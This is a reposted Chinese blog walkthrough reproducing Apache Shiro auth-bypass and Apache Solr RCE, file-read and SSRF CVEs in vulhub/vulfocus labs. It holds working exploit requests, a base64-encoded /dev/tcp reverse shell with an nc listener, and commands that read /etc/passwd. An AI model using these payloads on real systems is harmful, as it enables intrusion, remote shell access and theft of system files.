# 转载
：  框架安全-CVE 复现&Apache Shiro&Apache Solr漏洞复现

# 框架安全-CVE 复现&amp;Apache Shiro&amp;Apache Solr漏洞复现

## **目录**

[中间件列表](#%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%88%97%E8%A1%A8)

[Apache Shiro-组件框架安全](#Apache%20Shiro-%E7%BB%84%E4%BB%B6%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8)

[详解：shiro（java安全框架）](#%E8%AF%A6%E8%A7%A3%EF%BC%9Ashiro%EF%BC%88java%E5%AE%89%E5%85%A8%E6%A1%86%E6%9E%B6%EF%BC%89)

[漏洞复现](#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0)

[Apache Shiro认证绕过漏洞（CVE-2020-1957）](#Apache%20Shiro%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1957%EF%BC%89)

[​编辑CVE-2020-11989验证绕过漏洞](#%E2%80%8B%E7%BC%96%E8%BE%91CVE-2020-11989%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E)

[CVE_2016_4437 Shiro-550 &amp;&amp; CVE-2019-12422 Shiro-721 漏洞复现](#CVE_2016_4437%20Shiro-550%20%26%26%20CVE-2019-12422%20Shiro-721%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0)

[漏洞原理以及复现过程：](#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%EF%BC%9A)

[Apache Solr-组件框架安全详解：Solr详解](#Apache%20Solr-%E7%BB%84%E4%BB%B6%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8%E8%AF%A6%E8%A7%A3%EF%BC%9ASolr%E8%AF%A6%E8%A7%A3)

[披露的安全问题](#%E6%8A%AB%E9%9C%B2%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98)

[漏洞复现](#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0)

[Apache Solr 远程命令执行漏洞（CVE-2017-12629）](#Apache%20Solr%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-12629%EF%BC%89)

[任意文件读取&amp;&amp;命令执行（CVE-2019-17558）](#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%26%26%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88CVE-2019-17558%EF%BC%89)

[远程命令执行漏洞(CVE-2019-0193)](#%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28CVE-2019-0193%29)

[Solr 任意文件读取&amp;&amp; SSRF （CVE-2021-27905）](#Solr%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%26%26%20SSRF%20%EF%BC%88CVE-2021-27905%EF%BC%89)

---


## 中间件列表

<br/> 中间件及框架列表：

IIS，Apache，Nginx，Tomcat，Docker，K8s，Weblogic，JBoos，WebSphere，Jenkins ，GlassFish，Jetty，Jira，Struts2，Laravel，Solr，Shiro，Thinkphp，Spring，Flask，jQuery 等

常见开发框架

> 
<br/> 1、开发框架-PHP-Laravel-Thinkphp
2、开发框架-Javaweb-St2-Spring
3、开发框架-Python-django-Flask
4、开发框架-Javascript-Node.js-JQuery
5、其他框架-Java-Apache Shiro&amp;Apache Sorl


常见语言开发框架：

> 
PHP：Thinkphp Laravel YII CodeIgniter CakePHP Zend 等
JAVA：Spring MyBatis Hibernate Struts2 Springboot 等
Python：Django Flask Bottle Turbobars Tornado Web2py 等
Javascript：Vue.js Node.js Bootstrap JQuery Angular 等


## Apache Shiro-组件框架安全

### <br/> 详解：shiro（java安全框架）

Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。使用Shiro的易于理解的API,您可以快速、轻松地获得任何应用程序,从最小的移动应用程序到最大的网络和企业应用程序。

暴露的安全问题

> 
<br/> Apache Shiro &lt;= 1.2.4 默认密钥致命令执行漏洞[CVE-2016-4483]
Apache Shiro &lt; 1.3.2 验证绕过漏洞[CVE-2016-2807]
Apache Shiro &lt; 1.4.2 cookie oracle padding 漏洞 [CVE-2019-12442]
Apache Shiro &lt; 1.5.2 验证绕过漏洞 [CVE-2020-1957]
Apache Shiro &lt; 1.5.3 验证绕过漏洞 [CVE-2020-11989]
Apahce Shiro &lt; 1.6.0 验证绕过漏洞 [CVE-2020-13933]
Apahce Shiro &lt; 1.7.1 权限绕过漏洞 [CVE-2020-17523]


…

## 漏洞复现

### <br/> Apache Shiro认证绕过漏洞（CVE-2020-1957）

> 
<br/> Apache Shiro 是一个功能强大且易于使用的 Java 安全框架，可执行身份验证、授权、加密和会话管理。
在 1.5.2 之前的带有 Spring 动态控制器的 Apache Shiro 版本中，攻击者可以使用来构建恶意构建的请求，从而绕过目录身份验证。..;
影响范围：Apache Shiro &lt; 1.5.3


靶场：vulhub

参考：Apache Shiro认证绕过漏洞（CVE-2020-1957）复现<img alt="" height="606" src="https://img-blog.csdnimg.cn/fc8752cb4c0c4405966dbd2836e0512f.png" width="1200"/>

开启环境：<img alt="" height="442" src="https://img-blog.csdnimg.cn/6b48bcc556cc4982b373a3c372d373d6.png" width="1200"/>

访问web界面：<img alt="" height="400" src="https://img-blog.csdnimg.cn/62112adcf84b41b9aac2ed9c904cb761.png" width="1132"/>

对管理页面的直接请求是不可访问的，将被重定向到登录页面。/admin/<img alt="" height="612" src="https://img-blog.csdnimg.cn/cf04f69cc7ec4b40a87f9af67e2aa30b.png" width="1200"/>

构建恶意请求以绕过身份验证检查并访问管理页面。

payload：/xxx/..;/admin/

```
http://you-ip:8080/xxx/..;/admin/
```

### <img alt="" height="571" src="https://img-blog.csdnimg.cn/a08508575b1f4f478c35b780c13f13df.png" width="1200"/><br/> CVE-2020-11989验证绕过漏洞

<br/> 将Apache Shiro与Spring控制器一起使用时，特制请求可能会导致身份验证绕过。

靶场：vulfocus

开启环境：<img alt="" height="497" src="https://img-blog.csdnimg.cn/addd9032d6e84b41bd188c97e7ce1ec1.png" width="967"/>

访问web界面：<img alt="" height="495" src="https://img-blog.csdnimg.cn/ba62cbf00a7e42beaacc765e37548ea0.png" width="1200"/>

Poc：/admin/%20

影响范围：Apache Shiro &lt; 1.7.1

环境可能存在问题，没能跳转绕过。可使用github上的项目进行测试。

项目地址：shiro-cve-2020-17523

下载完成过后构建即可。具体可参考说明文档。

### CVE_2016_4437 Shiro-550 &amp;&amp; CVE-2019-12422 Shiro-721 漏洞复现

### <br/> 漏洞原理以及复现过程：

shiro反序列化漏洞Shiro-550/Shiro-721反序列化

#### Apache Solr-组件框架安全<br/> 详解：Solr详解

> 
Apache Solr 是一个开源的搜索服务，使用 Java 语言开发，主要基于 HTTP 和<br/> Apache Lucene 实现的。Solr 是一个高性能，采用 Java5 开发，基于 Lucene 的全<br/> 文搜索服务器。
Solr是一个独立的企业级搜索应用服务器，它对外提供类似于Web-service的API接口。用户可以通过http请求，向搜索引擎服务器提交一定格式的XML文件，生成索引；也可以通过Http Get操作提出查找请求，并得到XML格式的返回结果。


#### 披露的安全问题

> 
<br/> 远程命令执行 RCE（CVE-2017-12629）
远程命令执行 XXE（CVE-2017-12629）
任意文件读取 AND 命令执行（CVE-2019-17558）
远程命令执行漏洞(CVE-2019-0192)
远程命令执行漏洞(CVE-2019-0193)
未授权上传漏洞(CVE-2020-13957)
Apache Solr SSRF (CVE-2021-27905)


…

### 漏洞复现

#### <br/> Apache Solr 远程命令执行漏洞（CVE-2017-12629）

> 
<br/> Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。原理大致是文档通过Http利用XML加到一个搜索集合中。查询该集合也是通过 http收到一个XML/JSON响应来实现。
此次7.1.0之前版本总共爆出两个漏洞：XML实体扩展漏洞（XXE）和远程命令执行漏洞（RCE），二者可以连接成利用链，编号均为CVE-2017-12629。


环境：vulhub

参考：CVE-2017-12629-RCE复现

开启环境：<img alt="" height="642" src="https://img-blog.csdnimg.cn/d12519bf64ff419ea56ca69cc0b1041d.png" width="1200"/>

访问web界面：<img alt="" height="728" src="https://img-blog.csdnimg.cn/76d496cedcf24b30beb571e35fe933a4.png" width="1200"/>

利用：

首先创建一个listener，其中设置exe的值为我们想执行的命令，args的值是命令参数：//数据包内容：

```
POST /solr/demo/config HTTP/1.1
Host: 192.168.100.134:8983
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Connection: close
Content-Length: 161

{"add-listener":{"event":"postCommit","name":"newlistener","class":"solr.RunExecutableListener","exe":"sh","dir":"/bin/","args":["-c", "touch /tmp/rumilc.txt"]}}



```

<img alt="" height="482" src="https://img-blog.csdnimg.cn/c401d7b7648b4203aa3d8a83319d5fc9.png" width="1200"/><br/> 然后进行update操作，触发刚才添加的listener：//数据包内容：

```
POST /solr/demo/update HTTP/1.1
Host: 192.168.100.134:8983
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Connection: close
Content-Type: application/json
Content-Length: 15

[{"id":"test"}]

```

<img alt="" height="505" src="https://img-blog.csdnimg.cn/5fcc0b9a063445ba9a488dfe4df5e2dd.png" width="1200"/><br/> 验证：

```
docker ps 查看容器id
docker exec -it 容器id bash

```

成功创建<img alt="" height="405" src="https://img-blog.csdnimg.cn/8092b685eb0c46bdab9bec280c5ce6a6.png" width="1200"/>

可将命令换成反弹shell命令，进行反弹shell，逻辑思路不变，命令需要进行base64编码。

### 任意文件读取&amp;&amp;命令执行（CVE-2019-17558）

```
Solr 是基于 Apache Lucene（TM） 构建的流行、超快的开源企业搜索平台。

Apache Velocity是一个基于Java的模板引擎，它提供了一个模板语言去引用由Java代码定义的对象。Velocity是Apache基金会旗下的一个开源软件项目，旨在确保Web应用程序在表示层和业务逻辑层之间的隔离（即MVC设计模式）。 Apache Solr 5.0.0版本至8.3.1版本中存在输入验证错误漏洞。攻击者可借助自定义的Velocity模板功能，利用Velocity-SSTI漏洞在Solr系统上执行任意代码。
```

靶场：vulfocus

开启环境：<img alt="" height="533" src="https://img-blog.csdnimg.cn/a0a12cbb2aac4e81843b7ec27f10c164.png" width="959"/>

访问web界面：<img alt="" height="808" src="https://img-blog.csdnimg.cn/b2078a6b876143329e9e2d5e1862d15a.png" width="1200"/>

手工复现参考：通过 Velocity 自定义模板的 Apache Solr 远程代码执行

脚本工具：EXP地址

脚本一步到位，命令执行：

```
python2 solr_rce.py http://192.168.100.134:14226 id

```

```
python2 solr_rce.py http://192.168.100.134:14226 whoami
```

<img alt="" height="645" src="https://img-blog.csdnimg.cn/aaf4556bb90b4b41a503e656338cebb8.png" width="1200"/> 读取/查看文件：

```
python2 solr_rce.py http://192.168.100.134:14226 "cat /etc/passwd"

```

<img alt="" height="694" src="https://img-blog.csdnimg.cn/ea2e45ac59f64332a3072c50c23ed713.png" width="1200"/> 

### 远程命令执行漏洞(CVE-2019-0193)

> 
Apache Solr &lt; 8.2.0
版本Apache Solr 是一个开源的搜索服务器。 Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。 此次漏洞出现在Apache Solr的DataImportHandler，该模块是一个可选但常用的模块，用于从数据库和其他源中提取数据。 它具有一个功能，其中所有的DIH配置都可以通过外部请求的dataConfig参数来设置。 由于DIH配置可以包含脚本，因此攻击者可以通过构造危险的请求，从而造成远程命令执行。


靶场：vulhub

参考：Apache Solr 远程命令执行漏洞（CVE-2019-0193）复现<img alt="" height="508" src="https://img-blog.csdnimg.cn/69be7e72181944d89ebacd9b05cc4f43.png" width="1200"/>

开启环境：<img alt="" height="594" src="https://img-blog.csdnimg.cn/e882375ec76f4de497df98df0bd02f91.png" width="1081"/>

访问web界面：<img alt="" height="713" src="https://img-blog.csdnimg.cn/bd9f46fb75534731a7e443971cdb8be0.png" width="1200"/>

刚上来需要进行登录，需要登录之后的状态才可以。

```
执行命令：
docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db

```

命令执行成功后，需要等待一会，之后访问即可查看到Apache solr的管理页面，无需登录。<img alt="" height="227" src="https://img-blog.csdnimg.cn/597cebcae6d74d0e86b6c8ac0efbb5c6.png" width="1100"/>

接下来，首先打开刚刚创建好的核心，选择Dataimport功能并选择debug模式：<img alt="" height="681" src="https://img-blog.csdnimg.cn/f16e040fd6184200ab5d1e2b108d6d22.png" width="1200"/>

填入以下POC：test

```
&lt;dataConfig&gt;
  &lt;dataSource type="URLDataSource"/&gt;
  &lt;script&gt;&lt;![CDATA[
          function poc(){ java.lang.Runtime.getRuntime().exec("touch /tmp/rumilc.txt");
          }
  ]]&gt;&lt;/script&gt;
  &lt;document&gt;
    &lt;entity name="stackoverflow"
            url="https://stackoverflow.com/feeds/tag/solr"
            processor="XPathEntityProcessor"
            forEach="/feed"
            transformer="script:poc" /&gt;
  &lt;/document&gt;
&lt;/dataConfig&gt;
```

点击Execute with this Confuguration执行<img alt="" height="672" src="https://img-blog.csdnimg.cn/0cc506a4b4b94285b54f0bfba2b6b3b4.png" width="1200"/>

执行过后，等待一下：<img alt="" height="615" src="https://img-blog.csdnimg.cn/090dd6c66276484684004d8fd583a771.png" width="1200"/>

验证：

```
docker ps
docker exec -it 容器id bash

```

成功创建<img alt="" height="334" src="https://img-blog.csdnimg.cn/5f3e243ec738499c812505c0f7ef9a8e.png" width="1104"/>

可将命令换成反弹shell命令，需要进行base64编码，尝试反弹：

```
sh -i &gt;&amp; /dev/tcp/192.168.100.1/8888 0&gt;&amp;1
编码后：
bash -c {echo,c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xMDAuMS84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}

```

POC：

```
&lt;dataConfig&gt;
  &lt;dataSource type="URLDataSource"/&gt;
  &lt;script&gt;&lt;![CDATA[
          function poc(){ java.lang.Runtime.getRuntime().exec("bash -c {echo,c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xMDAuMS84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}");
          }
  ]]&gt;&lt;/script&gt;
  &lt;document&gt;
    &lt;entity name="stackoverflow"
            url="https://stackoverflow.com/feeds/tag/solr"
            processor="XPathEntityProcessor"
            forEach="/feed"
            transformer="script:poc" /&gt;
  &lt;/document&gt;
&lt;/dataConfig&gt;
```

监听端开启监听

```
nc -lvvp 8888

```

执行过后，稍等一下：<img alt="" height="658" src="https://img-blog.csdnimg.cn/281aebf0259645d6b1def911472ab84c.png" width="1200"/>

<img alt="" height="817" src="https://img-blog.csdnimg.cn/96268e7052db48838c6bee84e6fea839.png" width="1200"/> 

成功反弹shell：<img alt="" height="602" src="https://img-blog.csdnimg.cn/988c761dd74e4102a1860c4e522c37d1.png" width="1200"/>

### Solr 任意文件读取&amp;&amp; SSRF （CVE-2021-27905）

Apache Solr 是一个开源搜索服务器。该漏洞是由于没有对输入的内容进行校验，攻击者可利用该漏洞在未授权的情况下，构造恶意数据执行SSRF攻击，最终造成任意读取服务器上的文件。当 Apache Solr 不启用身份验证时，攻击者可以直接构建请求以启用特定配置，并最终导致 SSRF 或任意文件读取。

靶场：vulhub

参考：Apache Solr RemoteStreaming 任意文件读取和 SSRF

开启环境：<img alt="" height="476" src="https://img-blog.csdnimg.cn/4c46dd79d4144a94ab057d34817017cc.png" width="1086"/>

访问web界面：

利用：

```
//首先，访问提取数据库名称：
http://your-ip:8983/solr/admin/cores?indexInfo=false&amp;wt=json

```

<img alt="" height="684" src="https://img-blog.csdnimg.cn/6a9ac8cb2f4e4a83b991e70023f73edc.png" width="1200"/> 

发送如下请求，修改数据库配置启用：demo RemoteStreaming//数据包如下：

```
POST /solr/demo/config HTTP/1.1
Host: 192.168.100.134:8983
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 80

{"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true}}
```

发送数据包：<img alt="" height="534" src="https://img-blog.csdnimg.cn/48169d99566a491b8adcf8f0d921472b.png" width="1200"/>

然后通过以下方式读取任意文件：stream.url

```
//curl -i -s -k 'http://your-ip:8983/solr/demo/debug/dump param=ContentStreams&amp;stream.url=file:///etc/passwd'

curl -i -s -k "http://your-ip:8983/solr/demo/debug/dump?param=ContentStreams&amp;stream.url=file:///etc/passwd"

```

<br/> 成功读取：<img alt="" height="766" src="https://img-blog.csdnimg.cn/ab2cef7ea2504ae296cf7af5d74ed064.png" width="1200"/>

<img alt="" height="478" src="https://img-blog.csdnimg.cn/13019c2569f9454c96f46a3b9678a6ad.png" width="1200"/> 

查看组信息：

```
curl -i -s -k "http://your-ip:8983/solr/demo/debug/dump?param=ContentStreams&amp;stream.url=file:///etc/group"

```

<img alt="" height="333" src="https://img-blog.csdnimg.cn/3d1ca170be894479a375d2cedf99f595.png" width="1200"/> 

> 
<br/> 原文链接：https://blog.csdn.net/rumil/article/details/134175254


还没看够？可以关注！~

---


## **免费领取安全学习资料包！**<img alt="" height="768" src="https://img-blog.csdnimg.cn/45d8b770c73e4341a87c8fa05050aa50.png" width="1024"/>

 
